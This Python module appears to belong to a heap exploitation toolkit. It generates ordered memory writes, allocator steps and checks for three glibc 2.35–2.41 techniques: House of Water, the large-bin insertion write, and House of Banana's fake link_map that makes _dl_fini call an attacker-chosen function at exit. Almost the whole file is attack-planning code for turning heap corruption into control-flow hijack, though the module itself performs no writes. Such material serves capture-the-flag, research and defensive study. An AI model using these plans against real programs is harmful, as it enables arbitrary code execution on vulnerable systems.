#!/usr/bin/env python3
"""Fail-closed plans for modern glibc heap techniques missing from the base toolkit.

The module never allocates, runs a target, or performs I/O beyond its bounded JSON CLI.
It describes caller-addressed state transitions and sparse writes for glibc 2.35--2.41:

* the deterministic small-bin House of Water variant;
* the post-2.30 two-chunk large-bin insertion write; and
* House of Banana's ``_dl_fini`` fake-link-map endgame.

These are constraint plans, not exploit drivers.  Every private loader offset is supplied by the
caller, and all inverse verification is against a caller-provided memory-word mapping.
"""
from __future__ import annotations

import argparse
from functools import wraps
import json
import re
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Mapping


MAX_JSON = 1 << 20
UINT64_MAX = (1 << 64) - 1
DT_FINI = 13
DT_FINI_ARRAY = 26
DT_FINI_ARRAYSZ = 28


class PwnDepthHeapError(ValueError):
    """The supplied state cannot satisfy the reviewed heap technique."""


def _fail_closed(function):
    """Map every ordinary malformed-input failure to the lane's declared error."""

    @wraps(function)
    def guarded(*args, **kwargs):
        try:
            return function(*args, **kwargs)
        except PwnDepthHeapError:
            raise
        except Exception as exc:
            raise PwnDepthHeapError(f"malformed {function.__name__} input: {exc}") from exc

    return guarded


@dataclass(frozen=True)
class SparseWrite:
    """One ordered caller-side memory write; no write is performed by this module."""

    phase: str
    label: str
    address: int
    value: int
    width: int = 8

    def as_dict(self) -> dict[str, object]:
        return {
            "phase": self.phase,
            "label": self.label,
            "address": self.address,
            "value": self.value,
            "width": self.width,
        }


@dataclass(frozen=True)
class MemoryFact:
    """An exact word/byte expected when verifying a named plan phase."""

    phase: str
    label: str
    address: int
    value: int
    width: int = 8

    def as_dict(self) -> dict[str, object]:
        return {
            "phase": self.phase,
            "label": self.label,
            "address": self.address,
            "value": self.value,
            "width": self.width,
        }


@dataclass(frozen=True)
class HeapDepthPlan:
    """Immutable, reviewable technique plan."""

    technique: str
    glibc_version: str
    writes: tuple[SparseWrite, ...]
    facts: tuple[MemoryFact, ...]
    operations: tuple[str, ...]
    constraints: tuple[str, ...]
    computed: tuple[tuple[str, object], ...]

    def computed_dict(self) -> dict[str, object]:
        return dict(self.computed)

    def as_dict(self) -> dict[str, object]:
        return {
            "technique": self.technique,
            "glibc_version": self.glibc_version,
            "writes": [item.as_dict() for item in self.writes],
            "facts": [item.as_dict() for item in self.facts],
            "operations": list(self.operations),
            "constraints": list(self.constraints),
            "computed": dict(self.computed),
            "offline_only": True,
        }


@dataclass(frozen=True)
class BananaLayout:
    """Caller-supplied private x86-64 ``link_map`` offsets for one exact loader build."""

    size: int
    l_addr: int
    l_real: int
    l_next: int
    l_ns: int
    l_init_called: int
    l_init_called_mask: int
    l_info: int
    l_info_slots: int
    l_init_called_width: int = 4

    def validate(self) -> None:
        size = _bounded_int(self.size, "layout.size", minimum=0x40, maximum=1 << 20)
        slots = _bounded_int(self.l_info_slots, "layout.l_info_slots", minimum=29, maximum=4096)
        init_width = _bounded_int(
            self.l_init_called_width, "layout.l_init_called_width", minimum=4, maximum=4
        )
        mask = _bounded_int(
            self.l_init_called_mask,
            "layout.l_init_called_mask",
            minimum=1,
            maximum=(1 << (8 * init_width)) - 1,
        )
        if mask & (mask - 1):
            raise PwnDepthHeapError("l_init_called_mask must select exactly one packed bit")
        intervals = (
            ("l_addr", _offset(self.l_addr, "layout.l_addr"), 8),
            ("l_real", _offset(self.l_real, "layout.l_real"), 8),
            ("l_next", _offset(self.l_next, "layout.l_next"), 8),
            ("l_ns", _offset(self.l_ns, "layout.l_ns"), 8),
            ("l_state_flags", _offset(self.l_init_called, "layout.l_init_called"), init_width),
            ("l_info", _offset(self.l_info, "layout.l_info"), slots * 8),
        )
        for label, start, width in intervals:
            if start + width > size:
                raise PwnDepthHeapError(f"{label} extends beyond layout.size")
        for index, (left, left_at, left_width) in enumerate(intervals):
            for right, right_at, right_width in intervals[index + 1:]:
                if max(left_at, right_at) < min(left_at + left_width, right_at + right_width):
                    raise PwnDepthHeapError(f"private layout fields overlap: {left} and {right}")


def _version(value: object) -> str:
    if not isinstance(value, str) or len(value) > 32:
        raise PwnDepthHeapError("glibc_version must be a short 2.MINOR string")
    match = re.fullmatch(r"2\.(\d{1,2})(?:[.-][A-Za-z0-9+~._-]{1,24})?", value)
    if match is None:
        raise PwnDepthHeapError("glibc_version must look like 2.35 through 2.41")
    minor = int(match.group(1))
    if not 35 <= minor <= 41:
        raise PwnDepthHeapError("reviewed modern heap range is glibc 2.35 through 2.41")
    return f"2.{minor}"


def _integer(value: object, name: str, *, allow_zero: bool = False) -> int:
    if isinstance(value, str):
        try:
            value = int(value, 0)
        except ValueError as exc:
            raise PwnDepthHeapError(f"{name} is not an integer") from exc
    if isinstance(value, bool) or not isinstance(value, int) or not 0 <= value <= UINT64_MAX:
        raise PwnDepthHeapError(f"{name} must be an unsigned 64-bit integer")
    if not allow_zero and value == 0:
        raise PwnDepthHeapError(f"{name} must be non-zero")
    return value


def _address(value: object, name: str, *, alignment: int = 1, allow_zero: bool = False) -> int:
    result = _integer(value, name, allow_zero=allow_zero)
    if alignment <= 0 or (result and result % alignment):
        raise PwnDepthHeapError(f"{name} must be {alignment:#x}-aligned")
    if result:
        upper = result >> 48
        sign = (result >> 47) & 1
        if upper != (0xFFFF if sign else 0):
            raise PwnDepthHeapError(f"{name} must be a canonical x86-64 address")
    return result


def _offset(value: object, name: str) -> int:
    if isinstance(value, bool) or not isinstance(value, int) or value < 0:
        raise PwnDepthHeapError(f"{name} must be a non-negative integer offset")
    return value


def _bounded_int(value: object, name: str, *, minimum: int, maximum: int) -> int:
    if isinstance(value, bool) or not isinstance(value, int) or not minimum <= value <= maximum:
        raise PwnDepthHeapError(f"{name} must be in {minimum}..{maximum}")
    return value


def _chunk_size(value: object, name: str) -> int:
    result = _integer(value, name)
    if result < 0x400 or result % 0x10:
        raise PwnDepthHeapError(f"{name} must be a 0x10-aligned large-bin chunk size")
    return result


def _request2size(request: object) -> int:
    value = _integer(request, "sort_request")
    if value > 1 << 30:
        raise PwnDepthHeapError("sort_request exceeds the bounded planning limit")
    return max(0x20, (value + 8 + 0xF) & ~0xF)


@_fail_closed
def largebin_index_64(chunk_size: int) -> int:
    """Return glibc's published ``largebin_index_64`` value for an internal size."""

    size = _chunk_size(chunk_size, "chunk_size")
    if (size >> 6) <= 48:
        return 48 + (size >> 6)
    if (size >> 9) <= 20:
        return 91 + (size >> 9)
    if (size >> 12) <= 10:
        return 110 + (size >> 12)
    if (size >> 15) <= 4:
        return 119 + (size >> 15)
    if (size >> 18) <= 2:
        return 124 + (size >> 18)
    return 126


def _fact(phase: str, label: str, address: int, value: int, width: int = 8) -> MemoryFact:
    _address(address, f"{label}.address")
    if width not in (1, 2, 4, 8):
        raise PwnDepthHeapError("fact width must be 1, 2, 4, or 8")
    maximum = (1 << (width * 8)) - 1
    if isinstance(value, bool) or not isinstance(value, int) or not 0 <= value <= maximum:
        raise PwnDepthHeapError(f"{label}.value does not fit {width} bytes")
    if address + width > 1 << 64:
        raise PwnDepthHeapError(f"{label} crosses the address space")
    return MemoryFact(phase, label, address, value, width)


def _write(phase: str, label: str, address: int, value: int, width: int = 8) -> SparseWrite:
    item = _fact(phase, label, address, value, width)
    return SparseWrite(item.phase, item.label, item.address, item.value, item.width)


@_fail_closed
def build_house_of_water_plan(
    *,
    glibc_version: str,
    tcache_chunk_header_addr: int,
    relative_chunk_addr: int,
    small_start_addr: int,
    small_end_addr: int,
    primitive: str,
    tcache_capacity: int = 7,
    guards_present: bool,
    can_forge_chunk_sizes: bool,
    can_restore_chunk_sizes: bool,
    can_corrupt_link_lsb: bool,
    can_free_interior_headers: bool,
    allow_bruteforce: bool = False,
) -> HeapDepthPlan:
    """Plan the deterministic small-bin House of Water variant.

    Addresses named ``*_chunk_addr`` here are malloc user pointers except for the explicitly named
    tcache chunk header.  The reviewed geometry places the fake small-bin header at tcache+0x200
    and the immediately following 0x90 head chunk at tcache+0x290.
    """

    version = _version(glibc_version)
    tcache_header = _address(
        tcache_chunk_header_addr, "tcache_chunk_header_addr", alignment=0x1000
    )
    relative = _address(relative_chunk_addr, "relative_chunk_addr", alignment=0x10)
    start = _address(small_start_addr, "small_start_addr", alignment=0x10)
    end = _address(small_end_addr, "small_end_addr", alignment=0x10)
    capacity = _bounded_int(tcache_capacity, "tcache_capacity", minimum=1, maximum=64)
    if not isinstance(primitive, str) or primitive not in {"uaf", "double_free", "arbitrary_free"}:
        raise PwnDepthHeapError("primitive must be uaf, double_free, or arbitrary_free")
    for flag, name in (
        (guards_present, "guards_present"),
        (can_forge_chunk_sizes, "can_forge_chunk_sizes"),
        (can_restore_chunk_sizes, "can_restore_chunk_sizes"),
        (can_corrupt_link_lsb, "can_corrupt_link_lsb"),
        (can_free_interior_headers, "can_free_interior_headers"),
    ):
        if flag is not True:
            raise PwnDepthHeapError(f"deterministic House of Water requires {name}=True")
    if allow_bruteforce is not False:
        raise PwnDepthHeapError("brute-force House of Water routes are intentionally unsupported")
    if len({relative, start, end}) != 3:
        raise PwnDepthHeapError("relative/start/end chunks must be distinct")

    fake_header = tcache_header + 0x200
    fake_user = fake_header + 0x10
    relative_header = relative - 0x10
    start_header = start - 0x10
    end_header = end - 0x10
    if relative_header != fake_header + 0x90:
        raise PwnDepthHeapError(
            "relative chunk must immediately follow tcache geometry at fake_header+0x90"
        )
    if start != relative + 0xB0 or end != start + 0xB0:
        raise PwnDepthHeapError(
            "relative, guard, start, guard, end must use the reviewed 0x90/0x20 geometry"
        )
    if (relative_header & ~0xFF) != fake_header:
        raise PwnDepthHeapError("zeroing the relative-header LSB does not select the fake header")

    # uint16_t counts[64] occupies 0x80 bytes; entries[48]/[49] are the 0x320/0x330 heads.
    tcache_user = tcache_header + 0x10
    entry_320 = tcache_user + 0x80 + 48 * 8
    entry_330 = tcache_user + 0x80 + 49 * 8
    if entry_320 != fake_header + 0x10 or entry_330 != fake_header + 0x18:
        raise PwnDepthHeapError("internal House of Water tcache geometry mismatch")

    writes = (
        _write("forge-330", "small_start.fake_0x330_size", start - 0x18, 0x331),
        _write("restore-330", "small_start.restore_0x90_size", start - 0x08, 0x91),
        _write("forge-320", "small_end.fake_0x320_size", end - 0x18, 0x321),
        _write("restore-320", "small_end.restore_0x90_size", end - 0x08, 0x91),
        _write("link-smallbin", "small_start.fd_lsb", start, 0, 1),
        _write("link-smallbin", "small_end.bk_lsb", end + 0x08, 0, 1),
    )
    forged = (
        _fact("forged-heads", "fake_chunk.fd", fake_header + 0x10, end_header),
        _fact("forged-heads", "fake_chunk.bk", fake_header + 0x18, start_header),
        _fact("forged-heads", "small_start.size", start - 0x08, 0x91),
        _fact("forged-heads", "small_end.size", end - 0x08, 0x91),
    )
    linked = tuple(
        _fact("linked", item.label, item.address, item.value, item.width) for item in forged
    ) + (
        _fact("linked", "small_start.fd", start, fake_header),
        _fact("linked", "small_end.bk", end + 0x08, fake_header),
    )
    operations = (
        "allocate request 0x88 for relative, guard, small_start, guard, small_end, guard",
        f"allocate then free {capacity} request-0x88 chunks to fill the 0x90 tcache bin",
        "forge 0x331 before small_start, free small_start-0x10, then restore size 0x91",
        "forge 0x321 before small_end, free small_end-0x10, then restore size 0x91",
        "free small_end, relative, small_start; allocate a 0x700 request to sort the 0x90 small bin",
        "zero only small_start.fd and small_end.bk low bytes; both now name fake_header",
        f"drain {capacity} request-0x88 tcache entries, then allocate start, end, and fake user",
    )
    constraints = (
        "modified small-bin variant only: no guessing, sweep, or ASLR brute force",
        "the tcache per-thread chunk is the first heap chunk with the reviewed 0x290 geometry",
        "guard chunks prevent consolidation with each 0x90 participant and the top chunk",
        "fake frees must be achievable through the declared real application primitive",
        "the two final one-byte corruptions originate from links to relative_header",
        "allocator actions and exact shipped libc must be replayed in the pwn sandbox",
    )
    computed = (
        ("tcache_chunk_header", tcache_header),
        ("fake_chunk_header", fake_header),
        ("fake_user_return", fake_user),
        ("relative_chunk_header", relative_header),
        ("small_start_header", start_header),
        ("small_end_header", end_header),
        ("tcache_0x320_head", entry_320),
        ("tcache_0x330_head", entry_330),
        ("smallbin_chunk_size", 0x90),
        ("tcache_capacity", capacity),
        ("primitive", primitive),
        ("bruteforce", False),
    )
    return HeapDepthPlan(
        "house-of-water-smallbin", version, writes, forged + linked,
        operations, constraints, computed,
    )


@_fail_closed
def build_large_bin_plan(
    *,
    glibc_version: str,
    existing_chunk_addr: int,
    existing_chunk_size: int,
    victim_chunk_addr: int,
    victim_chunk_size: int,
    target_addr: int,
    bin_head_addr: int,
    sort_request: int,
    guards_present: bool,
    target_writable: bool,
    arena_managed: bool,
) -> HeapDepthPlan:
    """Plan the reviewed post-2.30 same-bin insertion write on amd64 glibc."""

    version = _version(glibc_version)
    existing = _address(existing_chunk_addr, "existing_chunk_addr", alignment=0x10)
    victim = _address(victim_chunk_addr, "victim_chunk_addr", alignment=0x10)
    target = _address(target_addr, "target_addr", alignment=8)
    head = _address(bin_head_addr, "bin_head_addr", alignment=8)
    existing_size = _chunk_size(existing_chunk_size, "existing_chunk_size")
    victim_size = _chunk_size(victim_chunk_size, "victim_chunk_size")
    if guards_present is not True:
        raise PwnDepthHeapError("large-bin insertion requires explicit guard/nonconsolidation state")
    if target_writable is not True:
        raise PwnDepthHeapError("large-bin write target must be explicitly known writable")
    if arena_managed is not True:
        raise PwnDepthHeapError("both attack chunks must be proven arena-managed and non-mmapped")
    if existing_size <= victim_size:
        raise PwnDepthHeapError("existing sorted chunk must be strictly larger than inserted victim")
    existing_index = largebin_index_64(existing_size)
    victim_index = largebin_index_64(victim_size)
    if existing_index != victim_index:
        raise PwnDepthHeapError("large chunks must sort into the same large-bin index")
    normalized_sort = _request2size(sort_request)
    if normalized_sort <= existing_size:
        raise PwnDepthHeapError("sort_request must normalize above both attack chunks")
    if existing < victim + victim_size and victim < existing + existing_size:
        raise PwnDepthHeapError("large-bin chunk ranges overlap")
    regions = (
        (existing, existing + existing_size, "existing chunk"),
        (victim, victim + victim_size, "victim chunk"),
        (head, head + 0x20, "bin sentinel"),
    )
    for index, (left, left_end, left_name) in enumerate(regions):
        for right, right_end, right_name in regions[index + 1:]:
            if max(left, right) < min(left_end, right_end):
                raise PwnDepthHeapError(f"{left_name} overlaps {right_name}")
    for left, right, label in regions:
        if max(target, left) < min(target + 8, right):
            raise PwnDepthHeapError(f"target_addr overlaps {label}")
    if target < 0x20:
        raise PwnDepthHeapError("target_addr is too low for bk_nextsize linkage")
    forged_bk_nextsize = target - 0x20

    # This is the deterministic singleton-largebin starting state.  More complex bins are rejected.
    pre = (
        _fact("pre", "existing.fd", existing + 0x10, head),
        _fact("pre", "existing.bk", existing + 0x18, head),
        _fact("pre", "existing.fd_nextsize", existing + 0x20, existing),
        _fact("pre", "existing.bk_nextsize", existing + 0x28, existing),
        _fact("pre", "bin_head.fd", head + 0x10, existing),
        _fact("pre", "bin_head.bk", head + 0x18, existing),
    )
    armed = tuple(
        _fact("armed", item.label, item.address, item.value, item.width)
        for item in pre if item.label != "existing.bk_nextsize"
    ) + (
        _fact("armed", "existing.bk_nextsize", existing + 0x28, forged_bk_nextsize),
    )
    triggered = (
        _fact("triggered", "constrained_pointer_write", target, victim),
    )
    writes = (
        _write("arm", "existing.bk_nextsize", existing + 0x28, forged_bk_nextsize),
    )
    operations = (
        "free the guarded larger existing chunk to unsorted",
        "make the sorting allocation so existing becomes the only member of its large bin",
        "free the guarded smaller victim to unsorted",
        "verify singleton fd/bk and fd_nextsize/bk_nextsize reciprocal state",
        "overwrite only existing.bk_nextsize with target-0x20",
        "repeat the sorting allocation; insertion writes victim_chunk_addr at target_addr",
    )
    constraints = (
        "both internal sizes are aligned, strictly ordered, and in one largebin_index_64 bucket",
        "existing_chunk_addr and victim_chunk_addr are internal chunk-header addresses",
        "both chunks are arena-managed (not mmap chunks) and the bin sentinel is disjoint",
        "existing starts as a singleton size-ring member with reciprocal bin-head fd/bk links",
        "the value written is constrained to victim_chunk_addr; it is not arbitrary scalar data",
        "guard chunks prevent forward/top consolidation and all nonforged links remain intact",
        "the exact allocator transition must be replayed against the shipped libc",
    )
    computed = (
        ("existing_chunk", existing), ("existing_size", existing_size),
        ("victim_chunk", victim), ("victim_size", victim_size),
        ("largebin_index", existing_index), ("write_target", target),
        ("written_value", victim), ("forged_bk_nextsize", forged_bk_nextsize),
        ("sort_request", _integer(sort_request, "sort_request")),
        ("sort_chunk_size", normalized_sort),
    )
    return HeapDepthPlan(
        "large-bin-post-2.30", version, writes, pre + armed + triggered,
        operations, constraints, computed,
    )


@_fail_closed
def build_house_of_banana_plan(
    *,
    glibc_version: str,
    large_bin_plan: HeapDepthPlan,
    layout: BananaLayout,
    fake_link_map_addr: int,
    loader_link_slot_addr: int,
    replaced_map_addr: int,
    replaced_map_next_addr: int,
    fini_dyn_addr: int,
    fini_array_size_dyn_addr: int,
    fini_array_addr: int,
    call_target: int,
    namespace_nloaded: int,
    real_maps_before_fake: int,
    real_maps_after_fake: int,
    l_addr: int = 0,
    namespace_id: int = 0,
    cleanup_trigger: str = "exit",
    replaces_real_map: bool = False,
    zeroed_backing: bool = False,
    sort_dependencies_safe: bool = False,
    audit_modules_present: bool = True,
) -> HeapDepthPlan:
    """Plan a count-preserving fake-link-map replacement for ``_dl_fini``.

    ``loader_link_slot_addr`` may be ``_ns_loaded`` or a real predecessor's ``l_next`` slot.
    The plan replaces exactly one real map, links to that map's former successor, and requires the
    resulting self-real map count to remain equal to ``_ns_nloaded``.
    """

    version = _version(glibc_version)
    if not isinstance(large_bin_plan, HeapDepthPlan) or large_bin_plan.technique != "large-bin-post-2.30":
        raise PwnDepthHeapError("House of Banana requires a reviewed large-bin plan")
    if large_bin_plan.glibc_version != version:
        raise PwnDepthHeapError("large-bin and Banana glibc profiles must match")
    if not isinstance(layout, BananaLayout):
        raise PwnDepthHeapError("layout must be a BananaLayout")
    layout.validate()
    fake = _address(fake_link_map_addr, "fake_link_map_addr", alignment=0x10)
    link_slot = _address(loader_link_slot_addr, "loader_link_slot_addr", alignment=8)
    replaced = _address(replaced_map_addr, "replaced_map_addr", alignment=8)
    next_map = _address(replaced_map_next_addr, "replaced_map_next_addr", alignment=8, allow_zero=True)
    fini_dyn = _address(fini_dyn_addr, "fini_dyn_addr", alignment=8)
    size_dyn = _address(fini_array_size_dyn_addr, "fini_array_size_dyn_addr", alignment=8)
    fini_array = _address(fini_array_addr, "fini_array_addr", alignment=8)
    target = _address(call_target, "call_target")
    load_bias = _address(l_addr, "l_addr", allow_zero=True)
    ns = _bounded_int(namespace_id, "namespace_id", minimum=0, maximum=15)
    nloaded = _bounded_int(namespace_nloaded, "namespace_nloaded", minimum=1, maximum=4096)
    before = _bounded_int(real_maps_before_fake, "real_maps_before_fake", minimum=0, maximum=4096)
    after = _bounded_int(real_maps_after_fake, "real_maps_after_fake", minimum=0, maximum=4096)
    if before + 1 + after != nloaded:
        raise PwnDepthHeapError("replacement chain count must equal namespace_nloaded")
    if (after == 0) != (next_map == 0):
        raise PwnDepthHeapError("replaced_map_next_addr must match whether real maps follow the fake")
    if replaced == fake:
        raise PwnDepthHeapError("fake_link_map_addr must replace a distinct real map")
    expected_mask = 0x08 if version == "2.35" else 0x10
    if layout.l_init_called_mask != expected_mask:
        raise PwnDepthHeapError(
            f"l_init_called_mask for glibc {version} must be {expected_mask:#x}"
        )
    if cleanup_trigger != "exit":
        raise PwnDepthHeapError("reviewed Banana route requires cleanup_trigger='exit'")
    for flag, name, expected in (
        (replaces_real_map, "replaces_real_map", True),
        (zeroed_backing, "zeroed_backing", True),
        (sort_dependencies_safe, "sort_dependencies_safe", True),
        (audit_modules_present, "audit_modules_present", False),
    ):
        if flag is not expected:
            raise PwnDepthHeapError(f"reviewed Banana route requires {name}={expected}")
    large = large_bin_plan.computed_dict()
    if large.get("write_target") != link_slot:
        raise PwnDepthHeapError("large-bin target must be the supplied loader link slot")
    if large.get("written_value") != fake:
        raise PwnDepthHeapError(
            "large-bin constrained value must equal fake_link_map_addr (victim chunk header)"
        )
    victim_size = large.get("victim_size")
    if isinstance(victim_size, bool) or not isinstance(victim_size, int) or victim_size < layout.size:
        raise PwnDepthHeapError("large-bin victim chunk is too small for the fake link_map layout")
    if fini_array < load_bias:
        raise PwnDepthHeapError("fini_array_addr precedes l_addr and cannot form d_ptr")
    for left_at, left_size, left_name in (
        (fake, layout.size, "fake_link_map"),
        (fini_dyn, 16, "DT_FINI_ARRAY record"),
        (size_dyn, 16, "DT_FINI_ARRAYSZ record"),
        (fini_array, 8, "fini array"),
    ):
        if left_at + left_size > 1 << 64:
            raise PwnDepthHeapError(f"{left_name} crosses the address space")
    ranges = (
        (fake, fake + layout.size, "fake_link_map"),
        (fini_dyn, fini_dyn + 16, "fini_dyn"),
        (size_dyn, size_dyn + 16, "size_dyn"),
        (fini_array, fini_array + 8, "fini_array"),
    )
    for index, (left, left_end, left_name) in enumerate(ranges):
        for right, right_end, right_name in ranges[index + 1:]:
            if max(left, right) < min(left_end, right_end):
                raise PwnDepthHeapError(f"Banana regions overlap: {left_name} and {right_name}")

    init_width = layout.l_init_called_width
    field_writes = (
        _write("stage-map", "link_map.l_addr", fake + layout.l_addr, load_bias),
        _write("stage-map", "link_map.l_real", fake + layout.l_real, fake),
        _write("stage-map", "link_map.l_next", fake + layout.l_next, next_map),
        _write("stage-map", "link_map.l_ns", fake + layout.l_ns, ns),
        _write(
            "stage-map", "link_map.l_init_called_mask",
            fake + layout.l_init_called, layout.l_init_called_mask, init_width,
        ),
        _write(
            "stage-map", "link_map.l_info[DT_FINI_ARRAY]",
            fake + layout.l_info + DT_FINI_ARRAY * 8, fini_dyn,
        ),
        _write(
            "stage-map", "link_map.l_info[DT_FINI_ARRAYSZ]",
            fake + layout.l_info + DT_FINI_ARRAYSZ * 8, size_dyn,
        ),
        _write("stage-dynamic", "fini_dyn.tag", fini_dyn, DT_FINI_ARRAY),
        _write("stage-dynamic", "fini_dyn.value", fini_dyn + 8, fini_array - load_bias),
        _write("stage-dynamic", "fini_size_dyn.tag", size_dyn, DT_FINI_ARRAYSZ),
        _write("stage-dynamic", "fini_size_dyn.value", size_dyn + 8, 8),
        _write("stage-array", "fini_array[0]", fini_array, target),
    )
    armed = tuple(
        _fact("armed", item.label, item.address, item.value, item.width) for item in field_writes
    ) + (_fact("armed", "link_map.l_info[DT_FINI]", fake + layout.l_info + DT_FINI * 8, 0),)
    loader_pre = (
        _fact("loader-pre", "loader_link_slot", link_slot, replaced),
        _fact("loader-pre", "replaced_map.l_next", replaced + layout.l_next, next_map),
    )
    triggered = tuple(
        _fact("triggered", item.label, item.address, item.value, item.width)
        for item in field_writes
    ) + (_fact("triggered", "loader_link_slot", link_slot, fake),)
    operations = (
        *large_bin_plan.operations,
        "confirm the loader link slot names the real map being replaced and preserve its successor",
        "after large-bin insertion replaces that slot with fake_link_map_addr, stop allocator use",
        "populate the caller-profiled fake link_map, two Elf64_Dyn records, and one-entry fini array",
        "allow normal exit cleanup to traverse this exact namespace map and call the fini array",
    )
    constraints = (
        "all link_map offsets and the loader link-slot address come from the exact supplied ld.so",
        "the fake replaces one real map and preserves _ns_nloaded self-real traversal count",
        "the packed l_init_called mask matches the reviewed glibc source for this exact minor",
        "the entire fake-map backing starts zeroed; DT_FINI and unused l_info slots remain NULL",
        "l_real points to self and l_next preserves the replaced real map's former successor",
        "DT_FINI_ARRAY and DT_FINI_ARRAYSZ l_info slots point at valid Elf64_Dyn records",
        "the target function ABI accepts the loader's fini-array call convention",
        "dependency sorting is independently proven safe and no audit module is active",
    )
    computed = (
        ("fake_link_map", fake), ("loader_link_slot", link_slot),
        ("replaced_map", replaced), ("replaced_map_next", next_map),
        ("fini_array", fini_array), ("call_target", target),
        ("l_addr", load_bias), ("namespace_id", ns),
        ("namespace_nloaded", nloaded), ("real_maps_before_fake", before),
        ("real_maps_after_fake", after),
        ("l_init_called_mask", layout.l_init_called_mask),
        ("large_bin_written_value", large["written_value"]),
        ("cleanup_trigger", cleanup_trigger),
    )
    return HeapDepthPlan(
        "house-of-banana-dl-fini", version, field_writes,
        loader_pre + armed + triggered, operations, constraints, computed,
    )


@_fail_closed
def verify_plan_phase(
    plan: HeapDepthPlan,
    memory: Mapping[int, int],
    *,
    phase: str,
) -> bool:
    """Inverse-check every declared fact for ``phase`` against integer memory cells."""

    if not isinstance(plan, HeapDepthPlan):
        raise PwnDepthHeapError("plan must be a HeapDepthPlan")
    if not isinstance(phase, str) or not phase:
        raise PwnDepthHeapError("phase must be non-empty text")
    if not isinstance(memory, Mapping):
        raise PwnDepthHeapError("memory must be an address-to-integer mapping")
    facts = tuple(item for item in plan.facts if item.phase == phase)
    if not facts:
        raise PwnDepthHeapError(f"plan has no verifiable facts for phase {phase!r}")
    normalized: dict[int, int] = {}
    try:
        for raw_address, raw_value in memory.items():
            address = _address(raw_address, "memory address")
            value = _integer(raw_value, f"memory[{address:#x}]", allow_zero=True)
            if address in normalized:
                raise PwnDepthHeapError(f"duplicate normalized memory address {address:#x}")
            normalized[address] = value
    except PwnDepthHeapError:
        raise
    except (AttributeError, TypeError, ValueError, OverflowError) as exc:
        raise PwnDepthHeapError("malformed memory mapping") from exc
    for fact in facts:
        if fact.address not in normalized:
            raise PwnDepthHeapError(f"missing {fact.label} at {fact.address:#x}")
        mask = (1 << (fact.width * 8)) - 1
        observed = normalized[fact.address]
        if observed > mask or observed != fact.value:
            raise PwnDepthHeapError(
                f"{fact.label} mismatch at {fact.address:#x}: "
                f"expected {fact.value:#x}, observed {observed:#x}"
            )
    return True


class _Parser(argparse.ArgumentParser):
    def error(self, message: str) -> None:  # pragma: no cover - exercised through main
        raise PwnDepthHeapError(message)


def _load_json(path: str) -> dict[str, Any]:
    try:
        with Path(path).open("rb") as handle:
            raw = handle.read(MAX_JSON + 1)
    except OSError as exc:
        raise PwnDepthHeapError(f"cannot read config: {exc}") from exc
    if len(raw) > MAX_JSON:
        raise PwnDepthHeapError("JSON config exceeds 1 MiB")
    try:
        value = json.loads(raw.decode("utf-8"))
    except (UnicodeError, json.JSONDecodeError) as exc:
        raise PwnDepthHeapError(f"invalid JSON config: {exc}") from exc
    if not isinstance(value, dict):
        raise PwnDepthHeapError("JSON root must be an object")
    return value


def _from_config(technique: str, config: dict[str, Any]) -> HeapDepthPlan:
    try:
        if technique == "water":
            return build_house_of_water_plan(**config)
        if technique == "largebin":
            return build_large_bin_plan(**config)
        if technique == "banana":
            large_config = config.get("large_bin")
            layout_config = config.get("layout")
            if not isinstance(large_config, dict) or not isinstance(layout_config, dict):
                raise PwnDepthHeapError("banana config requires large_bin and layout objects")
            outer = {key: value for key, value in config.items() if key not in {"large_bin", "layout"}}
            return build_house_of_banana_plan(
                large_bin_plan=build_large_bin_plan(**large_config),
                layout=BananaLayout(**layout_config),
                **outer,
            )
        raise PwnDepthHeapError("technique must be water, largebin, or banana")
    except PwnDepthHeapError:
        raise
    except (KeyError, TypeError, ValueError, OverflowError) as exc:
        raise PwnDepthHeapError(f"malformed {technique} config: {exc}") from exc


def main(argv: list[str] | None = None) -> int:
    parser = _Parser(prog="pwndepth_heap_plans.py", add_help=True)
    parser.add_argument("technique", choices=("water", "largebin", "banana"))
    parser.add_argument("config", help="bounded JSON plan parameters")
    try:
        try:
            args = parser.parse_args(argv)
        except SystemExit as exc:
            return exc.code if isinstance(exc.code, int) else 2
        plan = _from_config(args.technique, _load_json(args.config))
        print(json.dumps(plan.as_dict(), sort_keys=True))
        return 0
    except PwnDepthHeapError as exc:
        print(f"pwndepth_heap_plans: {exc}", file=sys.stderr)
        return 2
    except Exception as exc:  # guarded CLI boundary
        # The public CLI contract never leaks a stdlib exception from malformed input.
        print(f"pwndepth_heap_plans: malformed input: {exc}", file=sys.stderr)
        return 2


__all__ = [
    "BananaLayout", "HeapDepthPlan", "MemoryFact", "PwnDepthHeapError", "SparseWrite",
    "build_house_of_banana_plan", "build_house_of_water_plan", "build_large_bin_plan",
    "largebin_index_64", "verify_plan_phase", "main",
]


if __name__ == "__main__":
    raise SystemExit(main())
